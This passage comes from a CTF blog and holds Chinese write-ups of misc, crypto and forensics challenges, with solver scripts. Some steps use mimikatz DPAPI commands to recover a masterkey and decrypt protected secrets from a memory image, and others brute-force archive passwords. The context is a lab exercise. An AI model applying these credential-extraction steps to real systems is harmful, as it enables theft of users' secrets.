alt="image-20240201203152737"></p><p>使用 mftparser 对内存中的 MFT 条目进行分析，并将结果保存至 mftparser.txt</p><pre><code>MFT（Master File Table）是NTFS文件系统中的一个重要概念，它是用来存储文件和目录元数据的数据结构。MFT条目（MFT entry）是MFT中的一个记录，每个文件或目录在MFT中都有一个对应的MFT条目。每个MFT条目包含了文件或目录的元数据信息，如文件名、文件大小、创建时间、修改时间等。MFT条目还包含了指向文件数据的指针，以及其他一些属性信息。MFT条目的结构可以分为两部分：固定长度部分和可变长度部分。固定长度部分包含了MFT条目的基本信息，如文件类型、标志位等。可变长度部分则包含了文件属性信息，如文件名、时间戳等。MFT条目在NTFS文件系统中起着非常重要的作用，它记录了文件和目录的元数据信息，使得文件系统能够有效地管理和访问文件。通过MFT条目，文件系统可以快速定位到文件的位置和属性信息，从而实现对文件的读取和操作。</code></pre><pre><code>.\volatility.exe -f E:\Desktop\比赛\古剑山\misc\[红明谷CTF2022]MissingFile\memory --profile=Win7SP1x86_23418 mftparser &gt;mftparser.txt</code></pre><p>在扫描文件的时候 找到了一个Hacker文件夹 我们在mftparser.txt里面继续找这个文件夹 找到了里面的<code>S3cret</code>文件  将其进行保存</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402082249091.png" alt="image-20240201203830998"></p><pre><code class="python">with  open(&#39;S3cert.txt&#39;,&#39;r&#39;) as f:    data = f.readlines()    for line in data:        new_line = line[12:60:1]        print(new_line)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012057793.png" alt="image-20240201205733741"></p><p>我们使用mimikatz检查一下<code>S3cert</code>文件</p><pre><code>privilege::debug dpapi::blob /in:./S3cert</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012102545.png" alt="image-20240201210221496"></p><p>找到masterkey的guid 在mftparser.txt里面找一下这个guid</p><pre><code>470a5148-d8c9-4453-bf41-f0c09d158bfd</code></pre><p>找到了masterkey文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012105859.png" alt="image-20240201210539783"></p><p>一样 将这个masterkey文件导出来 命名为<code>470a5148-d8c9-4453-bf41-f0c09d158bfd</code></p><p>下面就和幸运饼干的步骤一样了 先得到masterkey </p><pre><code>dpapi::masterkey /in:.\470a5148-d8c9-4453-bf41-f0c09d158bfd /sid:S-1-5-21-206512979-2006505507-2644814589-1001 /password:123456 /protected</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012111117.png" alt="image-20240201211142048"></p><pre><code>092c4220064c30bc7f8b15d2d48957c4926af0632149b9c08cd87f34fc43aa1204d775bdc6ab429a0d4d0826fb80b08250b125d92913e2f7578cf778073bfe38</code></pre><p>在解密<code>S3cert</code>文件</p><pre><code>dpapi::blob /in:.\S3cert /masterkey:092c4220064c30bc7f8b15d2d48957c4926af0632149b9c08cd87f34fc43aa1204d775bdc6ab429a0d4d0826fb80b08250b125d92913e2f7578cf778073bfe38 /unprotect</code></pre><p>得到16进制的明文</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012140800.png" alt="image-20240201214002735"></p><p>解一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012140718.png" alt="image-20240201214035675"></p><h3 id="i-have-the-flag"><a href="#i-have-the-flag" class="headerlink" title="i_have_the_flag"></a>i_have_the_flag</h3><p>附件是一个js文件还有一个html文件 看一下html文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012019166.png" alt="image-20240201201933126"></p><p>随便测试一下  发现输入不同错误内容的时候 回显的内容不一样 也不像base64编码 那就转向分析js文件 看到一段关键代码</p><pre><code class="javascript">function ck(s) &#123;    try &#123;        ic    &#125; catch (e) &#123;        return;    &#125;    var a = [118, 108, 112, 115, 111, 104, 104, 103, 120, 52, 53, 54];    if (s.length == a.length) &#123;        for (i = 0; i &lt; s.length; i++) &#123;            if (a[i] - s.charCodeAt(i) != 3)                return ic = false;        &#125;        return ic = true;    &#125;    return ic = false;&#125;</code></pre><ul><li>该函数的目的是检查输入字符串是否满足特定条件，即字符串的每个字符的 ASCII 值与数组中对应位置的数字相差 3。</li><li>如果满足条件，函数返回 <code>true</code>，否则返回 <code>false</code>。</li></ul><p>很简单 我们直接将上面数组a的ascii码全部减三 在解ascii码就可以得到正确的key了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402012359818.png" alt="image-20240201235958771"></p><pre><code>simpleedu123</code></pre><p>输入 就可以得到正确的值了 就是flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402020000443.png" alt="image-20240202000046406"></p><h3 id="jpginside"><a href="#jpginside" class="headerlink" title="jpginside"></a>jpginside</h3><p>附件是<code>jpginside.xxx</code>这样一个文件 不知道是什么类型的 用file命令看一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402021204718.png"></p><p>是一个pyc文件 在线反编译一下</p><pre><code class="python">store = [    141,    183,    139,    129,    116,    117,    .....    49,    50]key = raw_input(&#39;Please input the key:&#39;)with open(&#39;excellent.jpg&#39;, &#39;wb&#39;) as jpg:    for i in range(len(store)):        jpg.write(chr(store[i] ^ ord(key[i % len(key)])))</code></pre><p>  先脚本恢复key 在上面的加密脚本里面用key加密的方式是对key的每一位循环使用 那我们只要取一部分明文和jpg图片格式里面相同的部分就可以恢复密钥 通过观察jpg图片结构 我们可以发现jpg的前13位都是一样的 那我们就选取这部分恢复我们的密钥</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402022347740.png" alt="image-20240202234745688"></p><pre><code class="python">encrypted_data = [0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01, 0x01]# 已知的加密后的数据store = [141, 183, 139, 129, 116, 117, 123, 116, 122, 114, 33, 115, 110]# 恢复密钥的过程key = &quot;&quot;for i in range(len(store)):    original_byte = store[i] ^ encrypted_data[i]    key += chr(original_byte)print(&quot;Recovered key:&quot;, key)</code></pre><p>得到结果是</p><pre><code>rotate1234!ro</code></pre><p>那按照前面说的密钥是按位循环使用 我们就取前11位就是完整密钥</p><pre><code>rotate1234!</code></pre><p>有了密钥我们直接利用上面的加密脚本 得到exllcent.jpg</p><pre><code class="python">store = [    141,    183,    139,    129,    116,    117,    .....    49,    50]key = rotate1234!with open(&#39;excellent.jpg&#39;, &#39;wb&#39;) as jpg:    for i in range(len(store)):        jpg.write(chr(store[i] ^ ord(key[i % len(key)])))</code></pre><p>注意这个脚本的运行欢迎是python2.7 python3运行可能会报错 </p><p>得到图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402082249587.png" alt="image-20240203000535700"></p><p>看文件结构发现尾部有一个压缩包 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402030010545.png" alt="image-20240203001001490"></p><p>分离出来发现crc有问题 修改为<code>504B</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402030010997.png" alt="image-20240203001035922"></p><p>正常解压  需要密码 猜测是前面的key 得到<code>jpek.txt</code></p><pre><code>jpek&#123;39i0jf49229fie5j33f02403hj953012&#125;</code></pre><p>随波逐流梭了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402030013607.png" alt="image-20240203001322559"></p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenere+++"></a>Vigenere+++</h3><pre><code class="python">import sysfrom secret_file  import *def _l(idx, s):    return s[idx:] + s[:idx]def main(p, k1, k2):    s = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_&#123;&#125;&quot;    t = [[_l((i+j) % len(s), s) for j in range(len(s))] for i in range(len(s))]    i1 = 0    i2 = 0    c = &quot;&quot;    for a in p:        c += t[s.find(a)][s.find(k1[i1])][s.find(k2[i2])]        i1 = (i1 + 1) % len(k1)        i2 = (i2 + 1) % len(k2)    return cflag=&quot;flag&#123;************************&#125;&quot;key=&quot;**********&quot;# * 为马赛克，长度为1。 # hint：  可以自己尝试下运行加密函数，看看秘钥对加密结果的影响。 # hint：  首先根据线索求秘钥，秘钥不唯一，找到一个有效的，就能爆破flag了。 print main(flag, key, key[::-1])# 程序运行结果（即密文为）:kY0awfsdlY1FFL8C3bi4GSYCF&#123;8W_E</code></pre><p>比较无脑 ctfwiki原题</p><p><a href="https://ctf-wiki.org/crypto/classical/summary/#_4">2017 SECCON Vigenere3d</a></p><pre><code class="python"># exp2.pyenc_str = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_&#123;&#125;&#39;dec_dic = &#123;k:v for v,k in enumerate(enc_str)&#125;encrypt = &#39;kY0awfsdlY1FFL8C3bi4GSYCF&#123;8W_E&#39;flag_bg = &#39;flag&#123;**************************&#125;&#39;sim_key = [dec_dic[encrypt[i]]-dec_dic[flag_bg[i]] for i in range(5)] # 破解模拟密钥sim_key = sim_key + sim_key[::-1]flag_ed = [dec_dic[v]-sim_key[k%10] for k,v in enumerate(encrypt)] # 模拟密钥解密flag_ed = &#39;&#39;.join([enc_str[i%len(enc_str)] for i in flag_ed]) # 解码print(flag_ed)# flag&#123;kynFTW2PRdH9lCZBf8IKDe6U&#125;</code></pre><h3 id="guess-the-key"><a href="#guess-the-key" class="headerlink" title="guess_the_key"></a>guess_the_key</h3><p>给了一个main.c 是加密函数的代码 给了msg01是明文 msg01.enc、msg02.enc是密文 先看加密代码</p><pre><code class="c">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(int argc, char **argv) &#123;    if (argc != 3) &#123;        printf(&quot;USAGE: %s INPUT OUTPUT\n&quot;, argv[0]);        return 0;    &#125;    FILE* input  = fopen(argv[1], &quot;rb&quot;);    FILE* output = fopen(argv[2], &quot;wb&quot;);    if (!input || !output) &#123;        printf(&quot;Error\n&quot;);        return 0;    &#125;    char key[] = &quot;guessthekey&quot;;    char d, q, t = 0;    int ijk = 0;    while ((q = fgetc(input)) != EOF) &#123;        d = (q + (key[ijk % strlen( key )] ^ t) + ijk*ijk) &amp; 0xff;        t = q;        ijk++;        fputc(d, output);    &#125;    return 0;&#125;</code></pre><p>其实关键的一步就是d &#x3D; (q + (key[ijk % strlen( key )] ^ t) + ijk*ijk) &amp; 0xff;</p><p>d是密文[i] q是明文[i] key是密钥[i] t在经历一次循环之后就是明文[i-1] ijk就是一个单独的参数 在每一次循环结束之后都自加1  </p><p>由此我们利用明文msg.01和msg01.enc来破解出key </p><p>在这段加密代码中 key是每一位循环使用的 但对于前几位明文(不超过key的长度)来说 key[ijk % strlen( key ) 这一部分其实就是key[i] </p><p>我们可以利用爆破的方法 利用上面这个公式反推出q[i] &#x3D; d[i] - key[i]^q[i-1] - pow(ijk, 2) </p><p>我们使用循环遍历每一位key[i]的值 当出现满足q[i] &#x3D;&#x3D; text[i] (text是已知的明文)的key[i]时 我们就将这个key输出    下面是脚本</p><pre><code class="python">ciphertext = [0x9E,0x97,0x4B,0xD2,0x9A,0x8B,0xAD,0xA1,0x89,0x09,0xDE,0xAD,0x69,0x23,0x4E,0x76,0x70,0xAB,0xE4,0x97,0x44,0x22,0x81,0x8D,0x7F,0x22,0x23,0x70,0x7F,0xB5,0xFF,0x68,0x72,0xC1,0xC2,0x4B]text = &quot;Hi,there is nothing here,heiheihei.&quot;t = 0i = 0for p in ciphertext:        for key in range(31, 125):  # 这里表示的是key的ascii值            q = (p - (key ^ t) - i*i) &amp; 0xff            q = chr(q)  # 将q的ascii值转换为字符            try:                if q == text[i]:                    print(chr(key), end=&quot;&quot;)  # 将key的ascii值转换为字符输出                    t = ord(q)               # 将q的ascii值赋予t                    i += 1                    break            except:                 print(&#39;&#39;)                    # VeryVeryLongKeyYouWillNeverKnowVery</code></pre><p>我们可以看到key出现了循环的部分 那么正确的key就是<code>VeryVeryLongKeyYouWillNeverKnow</code></p><p>有了key  我们就可以继续写脚本获得msg02</p><pre><code class="python">msg02_enc = [0xA9,0x9F,0x83,0x45,0xEE,0x87,0x9B,0x6E,0x0E,0xC3,0xD4,0xE9,0xD5,0x61,0x36,0x81,0x70,0x96,0xD4,0xD7,0xF9,0xE4,0xC9,0x8C,0xD3,0xEA,0xDE,0xAC,0x7B,0xC5,0xA9,0x84,0x97,0xCB,0xB8,0xA8,0x8A,0x95,0x54,0x6D,0xBA,0xC0,0x7B,0xA0,0x06,0x68,0x9F,0x02,0xA8,0xCD,0x2A,0x52,0x49,0x91,0xE7,0x4A,0x71,0x6B,0xA8,0x1E,0x8E,0xBB,0xDC,0xED,0x7C,0x0B,0x5C,0x04,0x74,0x6B,0xBE,0x1C,0xC1,0x59,0xBC,0xAD,0x12,0xC2,0xFB,0xDA,0xEB,0x26,0xB1,0x61,0xED,0xE0,0x5D,0xF2,0xC8,0xA3,0x27,0xC5,0x96,0x58,0xAD,0xF5,0x8D,0x54,0x05,0xBC,0x47,0xAD,0x0C,0xE9,0xC0,0xAF,0x48,0x02,0x25,0x1E,0xC9,0xAB,0x6F,0x5B,0x37,0x30,0xBD,0x3A,0xC8,0xC7,0xCD,0xA0,0x4F,0xD9,0xBC,0x72,0x7E,0x84,0x53,0xB5,0x87,0x48,0xE5,0x8D,0x92,0xA9,0xC7,0xBC,0xEE,0x13,0x01,0xE7,0x5D,0x73,0x99,0x59,0x29,0xDC,0x1A,0xEF,0xA6,0xBB,0xB6,0xFD,0x12,0x86,0x82,0x7E,0x4C,0x6F,0x84,0xBA,0xF7,0x52,0x80,0x92,0x0D,0xB0,0xD9,0x07,0x40,0xF3,0x17,0x95,0xAF,0xC9,0xBB,0xE8,0xE7,0xF1,0x08,0x75,0xF4,0xF1,0x03,0x1C,0xC3,0x11,0x36,0x49,0xAA,0x04,0x69,0xF7,0xA0,0xC5,0xCD,0x17,0xC6,0x23,0x6B,0xBE,0xE7,0x7B,0xE2,0xE6,0x4B,0xD4,0x5E,0x55,0xC3,0x0C,0x54,0xD3,0x5C,0x05,0x79,0xCE,0x1B,0xD4,0x91,0x50,0xF6,0xB4,0x36,0x41,0x46,0xD5,0x38,0xB1,0x21,0xE0,0xE2,0x38,0xA2,0x65,0xB7,0x16,0x71,0xF7,0x82,0x56,0x4D,0x22,0xE2,0x3B,0xEE,0x89,0x1E,0xA7,0xB3,0x46,0xFA,0x82,0x83,0x3D,0xB1,0x8C,0x85,0x92,0xB7,0x52,0x99,0x13,0xBA,0x72,0x43,0xDB,0x10,0xE8,0xA0,0x5B,0x39,0xDA,0xB3,0xF8,0xF8,0xE3,0xAF,0xA2,0x6A,0x29,0x2F,0x82,0x91,0x6E,0x41,0x58,0x77,0xC8,0xAD,0xA8,0x89,0xCF,0x00,0xB3,0xB6,0x27,0x5F,0xC6,0xD6,0xAF,0xB3,0x1C,0x6B,0xF1,0x25,0xB8,0x20,0xA0,0xD1,0x89,0xBA,0x04,0xF9,0xD5,0x8E,0x0B,0xB0,0x10,0x8B,0x37,0x99,0xBC,0xBA,0x05,0xB3,0x58,0xA3,0x5C,0xF4,0x86,0x43,0xEA,0x08,0x1D,0x79,0xFE,0x1B,0x05]key = &#39;VeryVeryLongKeyYouWillNeverKnow&#39;msg02 = &#39;&#39;t = 0for i in range(len(msg02_enc)):     if i ==0:        q = chr((msg02_enc[i] - (ord(key[i % len(key)]) ^ 0) - pow(i, 2)) &amp; 0xff)     else:        q = chr((msg02_enc[i] - (ord(key[i % len(key)]) ^ ord(t)) - pow(i, 2)) &amp; 0xff)     t = q     msg02 += qprint(msg02)# She had been shopping with her Mom in Wal-Mart. She must have been 6 years old, this beautiful brown haired, freckle-faced image of innocence. It was pouring outside. The kind of rain that gushes over the top of rain gutters, so much in a hurry to hit the Earth, it has no time to flow down the spout.flag&#123;101a6ec9f938885df0a44f20458d2eb4&#125;</code></pre><h3 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h3><pre><code>p=165183720742741436051373219716388644270093189046466421563632727622389425827620783096218651072108769567350808642169644915755493944233905573858905774991122631609402471527613272585988802294622263573574301013199411535656758222265554222107815469076608655188293263358371274025455477828555535371028164366376886408977q=120848273460784230746197749214740170558670241437030497317956826606952430354830550737450520592481405802317202852411775956584677841602475259120706429378240071206662182089399302414435162197602907213282222144680788273948123482886712835590321726087823477518087588076504167863011019333002124841000448268076303735731e=33c=10407733127291995335613764691145477155502676597183852092212444772475748406250517097288411248334115120781386833588013995106957807313657632637086223225958539244315092039575434338289689184523710991223212333496000621300008178955253701172159259970353872359828291763446333588873982621853358272632447440961028670921631505593309092190417674648927653583956106734654954561031328286272044755552317084498103486458373580383410475085969677647030080606373264155592552338785789990114607084241499363324045488462563945268471178702696791804080490936763759252660049728533344304874474003893472238560682850602644793844258072019357796047919</code></pre><p>上面就是我们能拿到的数据</p><p>看yolo师傅的博客学到是  有限域内开方 <a href="https://hucongting.com/2023/10/19/RSA%E4%B8%ADe%E5%92%8Cphi%E4%B8%8D%E4%BA%92%E7%B4%A0%E9%97%AE%E9%A2%98/">RSA中e和phi不互素问题</a></p><pre><code class="python">from Crypto.Util.number import *p=165183720742741436051373219716388644270093189046466421563632727622389425827620783096218651072108769567350808642169644915755493944233905573858905774991122631609402471527613272585988802294622263573574301013199411535656758222265554222107815469076608655188293263358371274025455477828555535371028164366376886408977q=120848273460784230746197749214740170558670241437030497317956826606952430354830550737450520592481405802317202852411775956584677841602475259120706429378240071206662182089399302414435162197602907213282222144680788273948123482886712835590321726087823477518087588076504167863011019333002124841000448268076303735731e=33c=10407733127291995335613764691145477155502676597183852092212444772475748406250517097288411248334115120781386833588013995106957807313657632637086223225958539244315092039575434338289689184523710991223212333496000621300008178955253701172159259970353872359828291763446333588873982621853358272632447440961028670921631505593309092190417674648927653583956106734654954561031328286272044755552317084498103486458373580383410475085969677647030080606373264155592552338785789990114607084241499363324045488462563945268471178702696791804080490936763759252660049728533344304874474003893472238560682850602644793844258072019357796047919n = p*qP.&lt;a&gt;=PolynomialRing(Zmod(p),implementation=&#39;NTL&#39;)f=a^e-cmps=f.monic().roots()P.&lt;a&gt;=PolynomialRing(Zmod(q),implementation=&#39;NTL&#39;)g=a^e-cmqs=g.monic().roots()flag=[]for mpp in mps:    x=mpp[0]    for mqq in mqs:        y=mqq[0]        solution = CRT_list([int(x), int(y)], [p, q])        flag.append(solution)for i in flag:    m=long_to_bytes(i)    if b&#39;flag&#39;in m:        print(m)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202402082248969.png" alt="image-20240208224859887"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024獬豸杯</title>
      <link href="/2024/01/30/2024%E7%8D%AC%E8%B1%B8%E6%9D%AF/"/>
      <url>/2024/01/30/2024%E7%8D%AC%E8%B1%B8%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="2024獬豸杯"><a href="#2024獬豸杯" class="headerlink" title="2024獬豸杯"></a>2024獬豸杯</h1><h2 id="手机备份包"><a href="#手机备份包" class="headerlink" title="手机备份包"></a>手机备份包</h2><h3 id="手机基本信息"><a href="#手机基本信息" class="headerlink" title="手机基本信息"></a>手机基本信息</h3><h4 id="1、IOS手机备份包是什么时候开始备份的。（标准格式：2024-01-20-12-12-12"><a href="#1、IOS手机备份包是什么时候开始备份的。（标准格式：2024-01-20-12-12-12" class="headerlink" title="1、IOS手机备份包是什么时候开始备份的。（标准格式：2024-01-20.12:12:12)"></a>1、IOS手机备份包是什么时候开始备份的。（标准格式：2024-01-20.12:12:12)</h4><pre><code>2024-01-15.14:19:44</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291605828.png" alt="image-20240129160542802"></p><p>文件名就是备份时间 也可以从<code>\IOS备份\2024年01月15日_14时19分44秒_iPhone\log.txt</code>里面看到</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291657598.png" alt="image-20240129165751567"></p><h4 id="2、请分析，该手机共下载了几款即时通讯工具。（标准格式：阿拉伯数字）"><a href="#2、请分析，该手机共下载了几款即时通讯工具。（标准格式：阿拉伯数字）" class="headerlink" title="2、请分析，该手机共下载了几款即时通讯工具。（标准格式：阿拉伯数字）"></a>2、请分析，该手机共下载了几款即时通讯工具。（标准格式：阿拉伯数字）</h4><pre><code>2</code></pre><p> <img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282139544.png" alt="image-20240128213900524"></p><h4 id="3、手机机主的号码得ICCID是多少。（标准格式：阿拉伯数字）"><a href="#3、手机机主的号码得ICCID是多少。（标准格式：阿拉伯数字）" class="headerlink" title="3、手机机主的号码得ICCID是多少。（标准格式：阿拉伯数字）"></a>3、手机机主的号码得ICCID是多少。（标准格式：阿拉伯数字）</h4><pre><code>89860320245121150689</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282139301.png" alt="image-20240128213922267"></p><h4 id="4、手机机主登录小西米语音的日期是什么时候。（标准格式：20240120）"><a href="#4、手机机主登录小西米语音的日期是什么时候。（标准格式：20240120）" class="headerlink" title="4、手机机主登录小西米语音的日期是什么时候。（标准格式：20240120）"></a>4、手机机主登录小西米语音的日期是什么时候。（标准格式：20240120）</h4><pre><code>20240115</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282145766.png" alt="image-20240128214539725"></p><h3 id="地图数据"><a href="#地图数据" class="headerlink" title="地图数据"></a>地图数据</h3><h4 id="5、请问嫌疑人家庭住址在哪个小区。（标准格式：松泽家园）"><a href="#5、请问嫌疑人家庭住址在哪个小区。（标准格式：松泽家园）" class="headerlink" title="5、请问嫌疑人家庭住址在哪个小区。（标准格式：松泽家园）"></a>5、请问嫌疑人家庭住址在哪个小区。（标准格式：松泽家园）</h4><pre><code>天铂华庭</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282147290.png" alt="image-20240128214759225"></p><h3 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h3><h4 id="1、Safari浏览器书签的对应数据库名称是什么。（标准格式：sqltie-db"><a href="#1、Safari浏览器书签的对应数据库名称是什么。（标准格式：sqltie-db" class="headerlink" title="1、Safari浏览器书签的对应数据库名称是什么。（标准格式：sqltie.db)"></a>1、Safari浏览器书签的对应数据库名称是什么。（标准格式：sqltie.db)</h4><pre><code>Bookmarks.db</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282149182.png" alt="image-20240128214929128"></p><h4 id="2、手机机主计划去哪里旅游。（标准格式：苏州"><a href="#2、手机机主计划去哪里旅游。（标准格式：苏州" class="headerlink" title="2、手机机主计划去哪里旅游。（标准格式：苏州)"></a>2、手机机主计划去哪里旅游。（标准格式：苏州)</h4><pre><code>拉萨</code></pre><p>火眼分析不出来safari的搜索记录 可以直接从源文件翻数据库 路径为</p><pre><code>2024年01月15日_14时19分44秒_iPhone/文件系统/2024年01月15日_14时19分44秒_iPhone.tar/AppDomain-com.apple.mobilesafari/Library/Preferences/com.apple.mobilesafari.plist</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282248530.png" alt="image-20240128224856438"></p><p>或者是使用AXIOM分析苹果手机备份 可以分析出safari的搜索记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282252719.png" alt="image-20240128225254615"></p><h3 id="即时通讯"><a href="#即时通讯" class="headerlink" title="即时通讯"></a>即时通讯</h3><h4 id="1、手机机主查询过那个人的身份信息。（标准格式：龙信）"><a href="#1、手机机主查询过那个人的身份信息。（标准格式：龙信）" class="headerlink" title="1、手机机主查询过那个人的身份信息。（标准格式：龙信）"></a>1、手机机主查询过那个人的身份信息。（标准格式：龙信）</h4><pre><code>龙黑</code></pre><p>老样子从小西米语音的聊天信息数据库里面找找东西 最近这个考点已经出现很多次了 数据库默认名称为<code>im5db</code> 提取出来 在navicat里面看一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291955563.png" alt="image-20240129195518516"></p><h4 id="2、请问机主共转多少费用用于数据查询。（标准格式：1000）"><a href="#2、请问机主共转多少费用用于数据查询。（标准格式：1000）" class="headerlink" title="2、请问机主共转多少费用用于数据查询。（标准格式：1000）"></a>2、请问机主共转多少费用用于数据查询。（标准格式：1000）</h4><pre><code>1100</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291956605.png" alt="image-20240129195607582"></p><h4 id="3、机主查询的信息中共有多少男性。（标准格式：阿拉伯数字）"><a href="#3、机主查询的信息中共有多少男性。（标准格式：阿拉伯数字）" class="headerlink" title="3、机主查询的信息中共有多少男性。（标准格式：阿拉伯数字）"></a>3、机主查询的信息中共有多少男性。（标准格式：阿拉伯数字）</h4><pre><code>3</code></pre><p>从苹果手机备份里面的图片里面找到一张嫌疑人查询的10个数据的截图</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291958449.png" alt="image-20240129195849411"></p><p>我们通过身份证号判断性别</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401292000506.png" alt="image-20240129200006479"></p><p>前8个里面有4个男性 但是王也的月份是14月 所以不算 最后面两个身份证不全或者不是身份证 无法判断性别 故不做判断 所以一共有三个男性</p><h2 id="计算机取证"><a href="#计算机取证" class="headerlink" title="计算机取证"></a>计算机取证</h2><p>直接分析计算机是分析不出来邮件的 我们需要解一下bitlocker 刚开始我是想找密钥文件来着 在计算机镜像里面有一个文件名交</p><pre><code>BitLocker 恢复密钥 60F74055-7745-439B-四位数字-FF4101D98050</code></pre><p>还去搞了半天掩码爆破 后面看到苹果手机备份里面直接找到bitlocker的密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282322424.png" alt="image-20240128232249370"></p><p>直接在火眼和取证大师里面就可以解bitlocker进行分析了</p><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><h4 id="1、计算机系统的安装日期是什么时候。（标准格式：20240120）"><a href="#1、计算机系统的安装日期是什么时候。（标准格式：20240120）" class="headerlink" title="1、计算机系统的安装日期是什么时候。（标准格式：20240120）"></a>1、计算机系统的安装日期是什么时候。（标准格式：20240120）</h4><pre><code>20240112</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282255635.png" alt="image-20240128225536600"></p><h3 id="系统痕迹"><a href="#系统痕迹" class="headerlink" title="系统痕迹"></a>系统痕迹</h3><h4 id="1、请问机主最近一次访问压缩包文件得到文件名称是什么。（标准格式：1-zip）"><a href="#1、请问机主最近一次访问压缩包文件得到文件名称是什么。（标准格式：1-zip）" class="headerlink" title="1、请问机主最近一次访问压缩包文件得到文件名称是什么。（标准格式：1.zip）"></a>1、请问机主最近一次访问压缩包文件得到文件名称是什么。（标准格式：1.zip）</h4><pre><code>data.zip</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401282256977.png" alt="image-20240128225650910"></p><h3 id="数据库分析"><a href="#数据库分析" class="headerlink" title="数据库分析"></a>数据库分析</h3><h4 id="1、还原数据库，请分析root用户最后一次更改密码的时间是什么时候。（标准格式：2024-01-20-12-12-12"><a href="#1、还原数据库，请分析root用户最后一次更改密码的时间是什么时候。（标准格式：2024-01-20-12-12-12" class="headerlink" title="1、还原数据库，请分析root用户最后一次更改密码的时间是什么时候。（标准格式：2024-01-20.12:12:12)"></a>1、还原数据库，请分析root用户最后一次更改密码的时间是什么时候。（标准格式：2024-01-20.12:12:12)</h4><p>解开bitlocker后 我们分析邮件内容 看到<code>2042@longxin.com</code>和<code>xiaohei@longxin.com</code>的邮件记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291128216.png" alt="image-20240129112850171"></p><p>里面提到了哈希值为<code>84fa25f20046ffd2c43991d9212bba96</code>的文件 在上一题中提到的最近访问的压缩包文件<code>data.zip</code>的哈希值就是这个</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291205220.png" alt="image-20240129120504177"></p><p>在邮件记录中还提到了密码是尾号为555的手机号 我们将其提取出来使用掩码爆破 很快就爆破出来了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291207751.png" alt="image-20240129120715680"></p><p>密码为<code>15566666555</code> 将其进行解压得到数据库文件 直接用火眼的数据库分析工具进行分析 在mysql数据库的user表中找到password_last_changed字段  就是最后一次修改密码的时间 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291720796.png" alt="image-20240129172053762"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202401291720743.png" alt="image-20240129172037698"></p><h4 id="2、请问mysql数据库中共存在多少个数据库。（标准格式：阿拉伯数字）"><a href="#2、请问mysql数据库中共存在多少个数据库。（标准格式：阿拉伯数字）" class="headerlink" title="2、请问mysql数据库中共存在多少个数据库。（标准格式：阿拉伯数字）"></a>2、请问mysql数据库中共存在多少个数据库。（标准格式：阿拉伯数字）</h4><p>这里还是不要用火眼数据库分析工具了 会不全 这里我们要恢复数据库 用这个文件夹覆盖我们本地小皮面板里面的<code>phpstudy_pro\Extensions\MySQL5.7.26\data</code>文件夹 </p><p><img 